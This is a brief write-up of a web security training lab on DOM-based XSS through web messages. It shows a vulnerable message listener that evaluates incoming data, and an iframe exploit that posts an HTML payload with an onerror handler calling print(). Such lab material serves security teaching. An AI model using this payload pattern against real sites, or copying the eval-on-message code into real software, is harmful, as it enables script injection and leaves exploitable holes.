// Lab: DOM XSS using web messages

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.



// Solution

1. Notice that the home page contains an addEventListener() call that listens for a web message.

// Example: 

<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>

2. Go to the exploit server and Inject the following exploit:

// Exploit 

<iframe src="https://0ad7006004bd4f4180fb1cc6009a0064.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
